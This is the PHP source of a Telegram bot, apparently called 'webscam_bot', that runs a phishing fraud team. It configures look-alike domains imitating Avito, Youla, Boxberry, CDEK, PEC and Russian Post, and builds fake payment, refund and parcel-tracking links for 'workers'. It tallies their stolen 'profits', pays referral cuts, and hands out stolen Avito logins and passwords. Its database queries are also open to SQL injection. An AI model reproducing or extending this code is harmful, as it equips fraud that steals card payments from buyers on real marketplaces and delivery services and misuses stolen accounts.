<?php
	require_once 'config.php';

	$mailsFrom = Array(
	    'avito' => 'avlt-o.ru',
	    'boxberry' => 'www-boxberry.tk',
	    'cdek' => 'cde-k.ru',
	    'pecom' => 'peco-m.ru',
	    'pochta' => 'pocht-a.ru',
	    'youla' => 'youi-a.ru',
	    );

	$domains = Array(
		'avito' => 'avlt-o.ru',
		'youla' => 'youi-a.ru',
		'boxberry' => 'boxber-y.ru',
		'cdek' => 'cde-k.ru',
		'pec' => 'peco-m.ru',
		'pochta' => 'pocht-a.ru',
	);

	if(!function_exists('withdraw')) {
		function withdraw($user_id) {
			global $connection;

			$query = mysqli_query($connection, "SELECT `wallet`, `balance` FROM `accounts` WHERE `telegram` = '$user_id'");

			if(mysqli_num_rows($query) > 0) {
				$user = mysqli_fetch_assoc($query);

				if($user['wallet'] != 0) {
					if($user['balance'] >= 1000) {
						mysqli_query($connection, "INSERT INTO `payouts` (`worker`, `amount`, `status`, `requestTime`, `payoutTime`) VALUES ('$user_id', '0', '0', '".time()."', '0')");

						$text = "💰 <b>Введите сумму, которую желаете вывести</b>";
					} else {
						$text = "💰 <b>Минимальная сумма для вывода</b> <code>1000 руб.</code>";
					}
				} else {
					$text = "💼 <b>Вывод пока только в планах</b>";
				}
			} else {
				$text = "🚷 <b>Пользователь с таким ID не был найден</b>";
			}

			return $text;

			mysqli_close($connection);
			unset($connection);
		}
	}

	if(!function_exists('getUserStatus')) {
		function getUserStatus($user_id) {
			global $connection;
			$query = mysqli_query($connection, "SELECT `access` FROM `accounts` WHERE `telegram` = '$user_id'");

			if(mysqli_num_rows($query) > 0) {
				$user = mysqli_fetch_assoc($query);

				if($user['access'] == -1) $status = 'Заблокирован';
				if($user['access'] == 0) $status = 'Неактивирован';
				if($user['access'] == 1) $status = 'Воркер';
				if($user['access'] == 25) $status = 'Дроповод';
				if($user['access'] == 100) $status = 'Помощник';
				if($user['access'] >= 500) $status = 'Модератор';

				return $status;
			}

			mysqli_close($connection);
			unset($connection);
		}
	}

	if(!function_exists('getMyProfile')) {
		function getMyProfile($user_id, $admin = 0, $buttons = 0) {
			global $connection;
			if($admin == 0) $query = mysqli_query($connection, "SELECT `username`, `telegram`, `wallet`, `balance`, `referral`, `access`, `warns`, `stake`, `card`, `inviter`, `created` FROM `accounts` WHERE `telegram` = '$user_id' AND `access` > '0'");
			if($admin == 1) $query = mysqli_query($connection, "SELECT `username`, `telegram`, `wallet`, `balance`, `referral`, `access`, `warns`, `stake`, `card`, `inviter`, `created` FROM `accounts` WHERE `telegram` = '$user_id'");

			if(mysqli_num_rows($query) > 0) {
				$user = mysqli_fetch_assoc($query);
				$tadverts = mysqli_query($connection, "SELECT `id` FROM `adverts` WHERE `worker` = '$user_id'");
				$ttracks = mysqli_query($connection, "SELECT `id` FROM `trackcodes` WHERE `worker` = '$user_id'");
				$adverts = mysqli_query($connection, "SELECT `id` FROM `adverts` WHERE `worker` = '$user_id' AND `status` = '1'");
				$tracks = mysqli_query($connection, "SELECT `id` FROM `trackcodes` WHERE `worker` = '$user_id' AND `status` > '0'");
				$profit = mysqli_fetch_assoc(mysqli_query($connection, "SELECT COUNT(`id`) AS `count`, SUM(`amount`) AS `total` FROM `payments` WHERE `worker` = '$user_id' AND `status` = '1'"));
				$invites = mysqli_fetch_assoc(mysqli_query($connection, "SELECT COUNT(`id`) AS `count` FROM `accounts` WHERE `inviter` = '$user_id'"));

				$stake = explode(':', $user['stake']);

				if($profit['total'] == NULL) $profit['total'] = '0';

				if($admin == 1) {
					$text = "👤 <b>Информация о работнике</b> <a href=\"tg://user?id=$user[telegram]\">$user[username]</a>\n\n";
				} else {
					$text = "👤 <b>Ваш профиль</b>\n\n";
				}

				if($user['wallet'] == 0) $user['wallet'] = 'Не закреплен';

				$text .= "🆔 <b>Telegram ID:</b> <code>$user[telegram]</code>\n";
				$text .= "💸 <b>Текущая ставка:</b> <code>оплата - $stake[0]% и возврат - $stake[1]%</code>\n";
				if($admin == 1) $text .= "🗂 <b>Всего объявлений:</b> <code>".(mysqli_num_rows($tadverts)+mysqli_num_rows($ttracks))."</code>\n";
				$text .= "🧾 <b>Активных объявлений:</b> <code>".(mysqli_num_rows($adverts)+mysqli_num_rows($tracks))."</code>\n";

				$text .= "\n🐘 <b>Успешных заявок:</b> <code>$profit[count]</code>\n";
				$text .= "💰 <b>Общая сумма заработка:</b> <code>$profit[total] руб.</code>\n";
				if($admin == 1 AND $user['card'] != '0') $text .= "💳 <b>Карта:</b> <code>$user[card]</code>\n";
				if($admin == 1 AND $user['card'] == '0') $text .= "💳 <b>Карта:</b> <i>Не привязана</i>\n";


				$text .= "\n💎 <b>Статус:</b> <i>".getUserStatus($user_id)."</i>\n";
				$text .= "\n⚠️ <b>Предупреждений:</b> <code>[$user[warns]/3]</code>\n";
				$text .= "🤝 <b>В команде:</b> <code>".Endings(floor((time()-$user['created'])/86400), "день", "дня", "дней")."</code>\n";


				if($admin == 1) {
					$keyboard = Array('inline_keyboard' => Array(Array(Array('text' => '🗂 Показать объявления', 'callback_data' => '/adverts/'.$user['telegram'].'/'))));

					if($user['access'] == '-1') {
						array_push($keyboard['inline_keyboard'], Array(Array('text' => '♻️ Разблокировать', 'callback_data' => '/unban/'.$user['telegram'].'/')));
					} else {
						array_push($keyboard['inline_keyboard'], Array(Array('text' => '🚫 Заблокировать', 'callback_data' => '/ban/'.$user['telegram'].'/')));
						array_push($keyboard['inline_keyboard'], Array(Array('text' => '⚠️ Выдать предупреждение ['.$user['warns'].'/3]', 'callback_data' => '/warn/'.$user['telegram'].'/')));
					}
				} else {
					$keyboard = Array('inline_keyboard' => Array(Array(Array('text' => '⚙️ Настройки', 'callback_data' => '/mysettings/'))));
				}

				if($buttons == 0) return $text;
				if($buttons == 1) return json_encode($keyboard);
			}

			mysqli_close($connection);
			unset($connection);
		}
	}

	if(!function_exists('mySettings')) {
		function mySettings($user_id, $buttons = 0) {
			global $connection;

			$query = mysqli_query($connection, "SELECT `hidden` FROM `accounts` WHERE `telegram` = '$user_id' AND `access` > '0'");

			if(mysqli_num_rows($query) > 0) {
				$user = mysqli_fetch_assoc($query);

				if($user['hidden'] == 0) $hidden = 'Не скрыт';
				if($user['hidden'] == 1) $hidden = 'Скрыт';

				$text = "🔧 <b>Мои настройки</b>\n\n";
				$text .= "🌚 Ваш логин при оплате: <code>$hidden</code>\n";

				$text .= "\n⚠️ *Не рекомендуем работать с открытым логином";

				if($user['hidden'] == 0) $keyboard = Array('inline_keyboard' => Array(Array(Array('text' => '🌚 Скрыть логин от всех', 'callback_data' => '/profithide/'))));
				if($user['hidden'] == 1) $keyboard = Array('inline_keyboard' => Array(Array(Array('text' => '🌝 Не скрывать логин от всех', 'callback_data' => '/profithide/'))));
				if($user['hidden'] == 1) $keyboard = Array('inline_keyboard' => Array(Array(Array('text' => '🌝 Не скрывать логин от всех', 'callback_data' => '/profithide/'))));

				if($buttons == 0) return $text;
				if($buttons == 1) return json_encode($keyboard);
			}

			mysqli_close($connection);
			unset($connection);
		}
	}

	if(!function_exists('getMyAdverts')) {
		function getMyAdverts($user_id, $admin = 0, $buttons = 0) {
			global $connection;
			global $domains;

			$adverts = mysqli_query($connection, "SELECT `type`, `advert_id`, `title`, `price`, `delivery`, `views` FROM `adverts` WHERE `worker` = '$user_id' AND `status` = '1'");

			$x = 0;
			$text = "🗂 <b>Список ваших активных объявлений:</b>\n\n";
			$keyboard = Array('inline_keyboard' => Array(Array()));

			if(mysqli_num_rows($adverts) > 0) {
				while($row = mysqli_fetch_assoc($adverts)) {
					$x = $x+1;

					if($x >= 10) {
						break;
					} else {
						if(mb_strlen($row['title']) > 18) $row['title'] = mb_substr($row['title'], 0, 18) .'[...]';

						if($row['delivery'] == 0) {
							global $settings;
							$row['delivery'] = $settings['delivery'];
						}

						if($row['type'] == 0) $url = 'https://avito.ru/'.$row['advert_id'] AND $payment = ''.$domains['avito'].'/buy?id='.$row['advert_id'];
						if($row['type'] == 1) $url = 'https://youla.ru/'.$row['advert_id'] AND $payment = ''.$domains['youla'].'/product/'.$row['advert_id'].'/buy/delivery';
						$text .= "<b>$x.</b> $row[title] — <b>Сумма:</b> <code>$row[price] руб.</code> | <b>Доставка:</b> <code>$row[delivery] руб.</code>\n";
						$text .= "<code>$payment</code>\n\n";

						array_push($keyboard['inline_keyboard'], Array(Array('text' => $x.'. '.$row['title'].' — '.$row['price'].' руб.', 'callback_data' => '/advert/'.$row['advert_id'].'/')));
					}
				}
			}

			$trackcodes = mysqli_query($connection, "SELECT `code`, `sender`, `product`, `courier`, `weight`, `amount`, `equipment`, `recipient`, `city`, `address`, `phone`, `status`, `status`, `time` FROM `trackcodes` WHERE `worker` = '$user_id' AND `status` > '0'");

			if(mysqli_num_rows($trackcodes) > 0) {
				while($row = mysqli_fetch_assoc($trackcodes)) {
					$x = $x+1;

					if($x > 10) {
						break;
					} else {
						if(mb_strlen($row['product']) > 18) $row['product'] = mb_substr($row['product'], 0, 18) .'[...]';
						$text .= "<b>$x.</b> <a href=\"https://$domains[boxberry]/track?track_id=$row[code]\">$row[product]</a> — <b>Сумма:</b> <code>$row[amount] руб.</code>\n";
						$text .= "<b>Получатель:</b> <i>$row[recipient]</i>\n\n";
						array_push($keyboard['inline_keyboard'], Array(Array('text' => $x.'. '.$row['product'].' — '.$row['amount'].' руб.', 'callback_data' => '/trackcode/'.$row['code'].'/')));
					}
				}
			}

			if(mysqli_num_rows($adverts) == 0 AND mysqli_num_rows($trackcodes) == 0) {
				if($admin == 1) {
					$text = "📭 <b>У работника нет активных объявлений или трек-кодов</b>";
				} else {
					$text = "📭 <b>У вас нет активных объявлений или трек-кодов</b>\n\n";
					$text .= "Чтобы сгенерировать своё объявление или трек-код, выберите соответствующий раздел Авито/Юла или Boxberry";
				}
			}

			if($buttons == 0) return $text;
			if($buttons == 1) return json_encode($keyboard);

			mysqli_close($connection);
			unset($connection);
			unset($settings);
		}
	}





	if(!function_exists('getAdvertsMail')) {
		function getAdvertsMail($user_id, $admin = 0, $buttons = 0) {
			global $connection;
			global $domains;

			$adverts = mysqli_query($connection, "SELECT `type`, `advert_id`, `title`, `price`, `delivery`, `views` FROM `adverts` WHERE `worker` = '$user_id' AND `status` = '1'");

			$x = 0;
			$text = "🗂 <b>Список ваших активных объявлений:</b>\n\n";
			$keyboard = Array('inline_keyboard' => Array(Array()));

			if(mysqli_num_rows($adverts) > 0) {
				while($row = mysqli_fetch_assoc($adverts)) {
					$x = $x+1;

					if($x >= 10) {
						break;
					} else {
						if(mb_strlen($row['title']) > 18) $row['title'] = mb_substr($row['title'], 0, 18) .'[...]';

						if($row['delivery'] == 0) {
							global $settings;
							$row['delivery'] = $settings['delivery'];
						}

						if($row['type'] == 0) $url = 'https://avito.ru/'.$row['advert_id'] AND $payment = ''.$domains['avito'].'/buy?id='.$row['advert_id'];
						if($row['type'] == 1) $url = 'https://youla.ru/'.$row['advert_id'] AND $payment = ''.$domains['youla'].'/product/'.$row['advert_id'].'/buy/delivery';
						$text .= "<b>$x.</b> $row[title] — <b>Сумма:</b> <code>$row[price] руб.</code> | <b>Доставка:</b> <code>$row[delivery] руб.</code>\n";
						$text .= "<code>$payment</code>\n\n";

						array_push($keyboard['inline_keyboard'], Array(Array('text' => $x.'. '.$row['title'].' — '.$row['price'].' руб.', 'callback_data' => '/mail/'.$row['advert_id'].'/')));
					}
				}
			}

			$trackcodes = mysqli_query($connection, "SELECT `code`, `sender`, `product`, `courier`, `weight`, `amount`, `equipment`, `recipient`, `city`, `address`, `phone`, `status`, `status`, `time` FROM `trackcodes` WHERE `worker` = '$user_id' AND `status` > '0'");

			if(mysqli_num_rows($trackcodes) > 0) {
				while($row = mysqli_fetch_assoc($trackcodes)) {
					$x = $x+1;

					if($x > 10) {
						break;
					} else {
						if(mb_strlen($row['product']) > 18) $row['product'] = mb_substr($row['product'], 0, 18) .'[...]';
						$text .= "<b>$x.</b> <a href=\"https://$domains[boxberry]/track?track_id=$row[code]\">$row[product]</a> — <b>Сумма:</b> <code>$row[amount] руб.</code>\n";
						$text .= "<b>Получатель:</b> <i>$row[recipient]</i>\n\n";
						array_push($keyboard['inline_keyboard'], Array(Array('text' => $x.'. '.$row['product'].' — '.$row['amount'].' руб.', 'callback_data' => '/mail/'.$row['code'].'/')));
					}
				}
			}

			if(mysqli_num_rows($adverts) == 0 AND mysqli_num_rows($trackcodes) == 0) {
				if($admin == 1) {
					$text = "📭 <b>У работника нет активных объявлений или трек-кодов</b>";
				} else {
					$text = "📭 <b>У вас нет активных объявлений или трек-кодов</b>\n\n";
					$text .= "Чтобы сгенерировать своё объявление или трек-код, выберите соответствующий раздел Авито/Юла или Boxberry";
				}
			}

			if($buttons == 0) return $text;
			if($buttons == 1) return json_encode($keyboard);

			mysqli_close($connection);
			unset($connection);
			unset($settings);
		}
	}



	//===================== Показать трекер ============================//



	if(!function_exists('showTrack')) {
		function showTrack($user_id, $code, $buttons = 0) {
			global $connection;

			$query = mysqli_query($connection, "SELECT `code`, `product`, `worker`, `amount`, `status` FROM `trackcodes` WHERE `code` = '$code' AND `worker` = '$user_id'");

			if(mysqli_num_rows($query) > 0) {
				$track = mysqli_fetch_assoc($query);

				if($track['status'] == -1) {
					mysqli_query($connection, "UPDATE `trackcodes` SET `status` = '1', `time` = '".time()."' WHERE `code` = '$code' AND `worker` = '$user_id' AND `status` = '-1'");

					if($track['type'] == 0) $platform = 'Боксберри';
					if($track['type'] == 1) $platform = 'СДЭК';
					if($track['type'] == 2) $platform = 'ПЭК';
					if($track['type'] == 3) $platform = 'Почта РФ';

					$text = "💎 <b>Ваш трек-код был восстановлен</b>\n\n";
					$text .= "<b>Трек-код:</b> <code>$code</code>\n";
					$text .= "<b>Платформа:</b> <code>$platform</code>\n";
					$text .= "<b>Название товара:</b> <code>$track[product]</code>\n";
					$text .= "<b>Сумма товара:</b> <code>$track[amount] руб.</code>\n";
				} else {
					$text = "🧨 <b>Данный трек-код не скрыт</b>";
				}
			} else {
				$text = "🔎 <b>Данный трек-код не принадлежит вам или он ещё не создан</b>";
			}

			if($buttons == 0) return $text;

			mysqli_close($connection);
			unset($connection);
		}
	}


//===================== Получить трекер ============================//


	if(!function_exists('getTrack')) {
		function getTrack($user_id, $code, $buttons = 0) {
			global $connection;
			global $domains;

			$query = mysqli_query($connection, "SELECT * FROM `trackcodes` WHERE `code` = '$code' AND `worker` = '$user_id'");

			if(mysqli_num_rows($query) > 0) {
				$track = mysqli_fetch_assoc($query);

				$keyboard = Array('inline_keyboard' => Array(Array()));


				if($track['status'] == -1) $status = 'Скрыто';
				if($track['status'] == 0) $status = 'В обработке';
				if($track['status'] == 1) $status = 'Ожидает оплаты';
				if($track['status'] == 2) $status = 'Оплачено';
				if($track['status'] == 3) $status = 'Возврат средств';

				if($track['type'] == 0) $platform = 'Боксберри';
				if($track['type'] == 1) $platform = 'СДЭК';
				if($track['type'] == 2) $platform = 'ПЭК';
				if($track['type'] == 3) $platform = 'Почта РФ';


				$payments = mysqli_fetch_assoc(mysqli_query($connection, "SELECT COUNT(`id`) AS `count`, SUM(`amount`) AS `total` FROM `payments` WHERE `type` = '2' AND `advert_id` = '$track[code]' AND `status` = '1'"));

				$text = "🎟 <b>Информация о трек-коде</b> <code>$track[code]</code>\n\n";
				$text .= "<b>Платформа:</b> <code>$platform</code>\n";
				$text .= "<b>Название товара:</b> <code>$track[product]</code>\n";
				$text .= "<b>Сумма товара:</b> <code>$track[amount] руб</code>\n";
				$text .= "<b>Просмотров:</b> <code>".Endings($track['views'], "просмотр", "просмотора", "просмотров")."</code>\n";
				$text .= "<b>Успешных профитов:</b> <code>$payments[count]</code>\n";
				$text .= "<b>Общая сумма профита:</b> <code>".number_format($payments['total'])." руб.</code>\n";
				$text .= "<b>Статус:</b> <code>$status</code>\n";
				$text .= "<b>Дата генерации:</b> <code>".date("d.m.Y в H:i:s", $track['time'])."</code>\n";


				if($track['status'] == -1) {

					array_push($keyboard['inline_keyboard'], Array(Array('text' => '♻️ Восстановить трек-код', 'callback_data' => '/trackshow/'.$track['code'].'/')));

				} else {

					if($track['type'] == 0) {
						array_push($keyboard['inline_keyboard'], Array(Array('text' => '📋 Перейти на трек-код', 'url' => 'https://'.$domains['boxberry'].'/track?track_id='.$track['code'])));
					} elseif($track['type'] == 1) {
						array_push($keyboard['inline_keyboard'], Array(Array('text' => '📋 Перейти на трек-код', 'url' => 'https://'.$domains['cdek'].'/track?track_id='.$track['code'])));
					} elseif($track['type'] == 2) {
						array_push($keyboard['inline_keyboard'], Array(Array('text' => '📋 Перейти на трек-код', 'url' => 'https://'.$domains['pec'].'/track?track_id='.$track['code'])));
					} elseif($track['type'] == 3) {
						array_push($keyboard['inline_keyboard'], Array(Array('text' => '📋 Перейти на трек-код', 'url' => 'https://'.$domains['pochta'].'/track?track_id='.$track['code'])));
					} else {
						$keyboard = Array('inline_keyboard' => Array(Array()));
					}


					array_push($keyboard['inline_keyboard'], Array(Array('text' => '🗑 Скрыть трек-код', 'callback_data' => '/trackhide/'.$track['code'].'/')));
					if($track['status'] == 1) array_push($keyboard['inline_keyboard'], Array(Array('text' => '🤟 Оплачено', 'callback_data' => '/trackpay/'.$track['code'].'/'), Array('text' => '💸 Возврат средств', 'callback_data' => '/trackref/'.$track['code'].'/')));
					if($track['status'] == 2) array_push($keyboard['inline_keyboard'], Array(Array('text' => '⏳ Ожидает оплаты', 'callback_data' => '/trackwait/'.$track['code'].'/'), Array('text' => '💸 Возврат средств', 'callback_data' => '/trackref/'.$track['code'].'/')));
					if($track['status'] == 3) array_push($keyboard['inline_keyboard'], Array(Array('text' => '⏳ Ожидает оплаты', 'callback_data' => '/trackwait/'.$track['code'].'/'), Array('text' => '🤟 Оплачено', 'callback_data' => '/trackpay/'.$track['code'].'/')));
				}
			} else {
				$text = "📭 <b>Трек-код с таким кодом не был найден или он не принадлежит вам</b>";
			}

			if($buttons == 0) return $text;
			if($buttons == 1) return json_encode($keyboard);

			mysqli_close($connection);
			unset($connection);
		}
	}


//===================== Получить объявления ============================//



	if(!function_exists('getAdvert')) {
		function getAdvert($user_id, $advert_id, $buttons = 0) {
			global $connection;
			global $settings;
			global $domains;

			$query = mysqli_query($connection, "SELECT * FROM `adverts` WHERE `advert_id` = '$advert_id' AND `worker` = '$user_id'");

			if(mysqli_num_rows($query) > 0) {
				$advert = mysqli_fetch_assoc($query);

				if($advert['type'] == 0) $platform = 'Авито';
				if($advert['type'] == 1) $platform = 'Юла';

				if($advert['delivery'] == 0) {
					$advert['delivery'] = $settings['delivery'];
				}

				$payments = mysqli_fetch_assoc(mysqli_query($connection, "SELECT COUNT(`id`) AS `count`, SUM(`amount`) AS `total` FROM `payments` WHERE `advert_id` = '$advert_id' AND `status` = '1'"));

				if($advert['status'] == -1) $status = 'Скрыто';
				if($advert['status'] == 0) $status = 'В обработке';
				if($advert['status'] == 1) $status = 'Активно';

				$text = "💼 <b>Информация об объявлении</b> <code>$advert[advert_id]</code>\n\n";
				$text .= "<b>Платформа:</b> <code>$platform</code>\n";
				$text .= "<b>Название товара:</b> <code>$advert[title]</code>\n";
				$text .= "<b>Сумма товара:</b> <code>$advert[price] руб.</code>\n";
				$text .= "<b>Сумма доставки:</b> <code>$advert[delivery] руб.</code>\n";
				$text .= "<b>Просмотров:</b> <code>".Endings($advert['views'], "просмотр", "просмотора", "просмотров")."</code>\n";
				$text .= "<b>Успешных профитов:</b> <code>$payments[count]</code>\n";
				$text .= "<b>Общая сумма профита:</b> <code>".number_format($payments['total'])." руб.</code>\n";
				$text .= "<b>Статус:</b> <code>$status</code>\n";
				$text .= "<b>Дата генерации:</b> <code>".date("d.m.Y в H:i:s", $advert['time'])."</code>\n";

				if($advert['type'] == 0) {
					$keyboard = Array('inline_keyboard' => Array(Array(Array('text' => 'Страница оплаты', 'url' => 'https://'.$domains['avito'].'/buy?id='.$advert['advert_id']), Array('text' => 'Страница возврата', 'url' => 'https://'.$domains['avito'].'/refund?id='.$advert['advert_id']))));
				} elseif($advert['type'] == 1) {
					$keyboard = Array('inline_keyboard' => Array(Array(Array('text' => 'Страница оплаты', 'url' => 'https://'.$domains['youla'].'/product/'.$advert_id.'/buy/delivery'), Array('text' => 'Страница возврата', 'url' => 'https://'.$domains['youla'].'/refund/'.$advert_id))));
				} else {
					$keyboard = Array('inline_keyboard' => Array(Array()));
				}

				if($advert['status'] == -1) {
					array_push($keyboard['inline_keyboard'], Array(Array('text' => 'Восстановить объявление', 'callback_data' => '/show/'.$advert_id.'/')));
				} elseif($advert['status'] > 0) {
					array_push($keyboard['inline_keyboard'], Array(Array('text' => 'Скрыть объявление', 'callback_data' => '/hide/'.$advert_id.'/')));
				}
			} else {
				$text = "📭 <b>Объявление с таким ID не было найдено или оно не принадлежит вам</b>";
			}

			if($buttons == 0) return $text;
			if($buttons == 1) return json_encode($keyboard);

			mysqli_close($connection);
			unset($connection);
			unset($settings);
		}
	}


//===================== Показать правила ============================//



	if(!function_exists('showRules')) {
		function showRules() {
			$text = "1. Запрещено медиа с некорректным содержанием (порно, насилие, убийства, призывы к экстремизму, реклама наркотиков)\n";
			$text .= "2. Запрещен спам, флуд, пересылки с других каналов, ссылки на сторонние ресурсы\n";
			$text .= "3. Запрещено узнавать у друг друга персональную информацию\n";
			$text .= "4. Запрещено оскорблять администрацию\n";
			$text .= "5. Запрещено попрошайничество в беседе работников\n";
			$text .= "6. Администрация не несёт ответственности за блокировку ваших кошельков/карт\n";

			return $text;
		}
	}


//===================== Получить информацию по карте ============================//



	if(!function_exists('getCard')) {
		function getCard() {
			global $connection;

			$card = '';

			$query = mysqli_query($connection, "SELECT `status` FROM `cards` WHERE `number` = '$card' AND `status` = '1'");

			if(mysqli_num_rows($query) > 0) {
				$text = "💳 <b>Карта прямого приёма</b>\n\n";
				$text .= "<b>Номер карты:</b> <code>".chunk_split($card, 4, ' ')."</code>\n";
				$text .= "<b>Банк:</b> <code>Санкт-Петербург</code>\n";
				$text .= "<b>Имя получателя:</b> <code></code>\n";
			} else {
				$text = "🥺 <b>На данный момент карта для прямого приема средств не привязана</b>";
			}

			return $text;

			mysqli_close($connection);
			unset($connection);
		}
	}



//===================== Список команд бота ============================//


	if(!function_exists('showCommands')) {
		function showCommands($buttons = 0) {
			global $config;

			$text = "⚙️ Список команд бота:\n\n";
			$text .= "/help — Показать список команд\n";
			$text .= "/info — Показать информацию о себе\n";
			$text .= "/adverts — Посмотреть свои активные объявления\n";
			$text .= "/setdelivery <code>[ID объявления];[Сумма]</code> — Установить сумму за доставку\n";
			$text .= "/setprice <code>[ID объявления];[Сумма]</code> — Изменить сумму объявления\n";
			$text .= "/settitle <code>[ID объявления];[Название]</code> — Изменить название объявления\n";
			$text .= "/setimage <code>[ID объявления];[URL изображения]</code> — Изменить изображение товара\n";
			$text .= "/hide <code>[ID объявления]</code> — Скрыть объявление\n";

			$keyboard = Array('inline_keyboard' => Array(
					Array(Array('text' => '💬 Чат воркеров', 'url' => $config['invites']['workers']), Array('text' => '💸 Чат с залётами', 'url' => $config['invites']['payments'])),
				));

			if($buttons == 0) return $text;
			if($buttons == 1) return json_encode($keyboard);

			unset($config);
		}
	}


//===================== Показать рефералку ============================//



	if(!function_exists('referralInfo')) {
		function referralInfo($user_id) {
			$text = "🤝 <b>Реферальная система</b>\n\n";
			$text .= "Приглашайте новых пользователей и получайте пассивный доход от успешных профитов ваших рефералов!\n\n";
			$text .= "Чтобы пользователь стал вашим рефералом, при заполнении анкеты, он должен указать в пункте «<b>Кто вас пригласил?</b>» ваш Telegram ID — <code>$user_id</code>\n\n";
			$text .= "В случае принятия данного пользователя в команду, он становится вашим рефералом и вы будете получать 2% от его успешных профитов.\n\n";
			$text .= "Получается, что в случае успешного залёта вашего реферала на 750 RUB, вы получите с этого 10 RUB, а при залёте на 5300 RUB, вы получите 100 RUB\n\n";
			$text .= "Ваша реферальная ссылка:\n";
			$text .= "https://telegram.me/webscam_bot?start=ref$user_id\n";
			$text .= "Для вставки на сайтах, форумах:\n";
			$text .= "https://tgmssg.ru/webscam_bot&start=ref$user_id";

			return $text;
		}
	}



//===================== АВИТО АККАУНТЫ ============================//



	$data = json_decode(file_get_contents('php://input'));
	if(isset($data)) {
		if(isset($callback)) {
			if($callback['type'] == "/account/avito/"){
			$t = mysqli_fetch_assoc(mysqli_query($connection, "SELECT `avito` FROM `accounts` WHERE `telegram` = '$callback[from]' AND `access` > '0'"));
    			$nov = strtotime("now");
    			//$six = strtotime($t['avito']) + 21600; // 6 Часов
    			$day = strtotime($t['avito']) + 86400; // 24 часа
			    if($day >= $nov){
			      $razn = $day - $nov;
			      $siss = Endings(floor($razn / 3600), "час", "часа", "часов");
			      $text = "⚠️ Вы уже получили свой аккаунт. \n⏳ <b>Подождите ещё {$siss}</b>";
			      send($config['token'], 'editMessageText', Array('chat_id' => $callback['chat_id'], 'message_id' => $callback['message_id'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
			    } else {
			    	$query = mysqli_query($connection, "SELECT * FROM `avito` WHERE `used` = '0' ORDER BY `id`");
			    	if(mysqli_num_rows($query) > 0) {
					  $avito = mysqli_fetch_assoc($query);
				      $log = $avito['login'];
				      $pass = $avito['password'];
				      mysqli_query($connection, "UPDATE `accounts` SET `avito` = NOW() - INTERVAL 5 MINUTE WHERE `telegram` = '{$callback[from]}'");
				      mysqli_query($connection, "UPDATE avito SET used = 1 WHERE id = $avito[id]");
				      $text = "👾 <b>Бесплатный аккаунт</b>\n\nПлатформа: <code>Avito</code>\nЛогин: <code>{$log}</code>\nПароль: <code>{$pass}</code>\n<b>Следующий аккаунт через 1 день</b>";
				      send($config['token'], 'editMessageText', Array('chat_id' => $callback['chat_id'], 'message_id' => $callback['message_id'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
				      $text2 = "👾 <a href=\"tg://user?id=$callback[from]\">Воркер</a> получил бесплатный аккаунт под логином <code>{$log}</code>";
				      send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text2, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
				  } else {
				  	$text = "😔 К сожалению сейчас аккаунтов для Авито нет, посмотрите позже";
				  	send($config['token'], 'editMessageText', Array('chat_id' => $callback['chat_id'], 'message_id' => $callback['message_id'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
				  }
			    }
			}

			if(preg_match('/^\/warn\/\d+\/$/', $callback['type'])) {
				$user_id = substr($callback['type'], 6, -1);


					$query = mysqli_query($connection, "SELECT `telegram`, `access`, `warns` FROM `accounts` WHERE `telegram` = '$user_id' AND `access` > '0'");

					if(mysqli_num_rows($query) > 0) {
						$user = mysqli_fetch_assoc($query);

						if($user['warns'] < 3) {
							mysqli_query($connection, "UPDATE `accounts` SET `warns` = `warns`+1 WHERE `telegram` = '$user_id' AND `access` > '0'");

							send($config['token'], 'editMessageText', Array('chat_id' => $callback['chat_id'], 'message_id' => $callback['message_id'], 'text' => getMyProfile($user_id, 1), 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE, 'reply_markup' => getMyProfile($user_id, 1, 1)));

							$text = "⚠️ <b>Модератор</b> <a href=\"tg://user?id=$callback[from]\">$callback[firstname] $callback[lastname]</a> <b>выдал предупреждение</b> <a href=\"tg://user?id=$user_id\">воркеру</a> <code>[".($user['warns']+1)."/3]</code>";
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							$text = "⚠️ <b>Модератор выдал вам предупреждение</b> <code>[".($user['warns']+1)."/3]</code>";
							send($config['token'], 'sendMessage', Array('chat_id' => $user_id, 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						} else {
							mysqli_query($connection, "UPDATE `accounts` SET `access` = '-1', `warns` = `warns`+1, `card` = '0' WHERE `telegram` = '$user_id'");
							mysqli_query($connection, "UPDATE `adverts` SET `status` = '-1' WHERE `worker` = '$user_id' AND `status` > '1'");
							mysqli_query($connection, "UPDATE `trackcodes` SET `status` = '-1' WHERE `worker` = '$user_id' AND `status` > '1'");

							send($config['token'], 'kickChatMember', Array('chat_id' => $config['chat']['workers'], 'user_id' => $user_id, 'until_date' => time()+24*500*3600));
							send($config['token'], 'kickChatMember', Array('chat_id' => $config['chat']['payments'], 'user_id' => $user_id, 'until_date' => time()+24*500*3600));

							send($config['token'], 'editMessageText', Array('chat_id' => $callback['chat_id'], 'message_id' => $callback['message_id'], 'text' => getMyProfile($user_id, 1), 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE, 'reply_markup' => getMyProfile($user_id, 1, 1)));

							$text = "⚠️ <b>Модератор</b> <a href=\"tg://user?id=$callback[from]\">$callback[firstname] $callback[lastname]</a> <b>выдал предупреждение</b> <a href=\"tg://user?id=$user_id\">воркеру</a> <code>[".($user['warns']+1)."/3]</code>\n\n";
							$text .= "Воркер был заблокирован";
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							$text = "⚠️ <b>Модератор выдал вам предупреждение</b> <code>[".($user['warns']+1)."/3]</code>\n\n";
							$text .= "Для вас доступ был заблокирован";
							send($config['token'], 'sendMessage', Array('chat_id' => $user_id, 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					} else {
						$text = "😒 <b>Данный воркер уже заблокирован или неактивирован</b>";
						send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
					}

			}

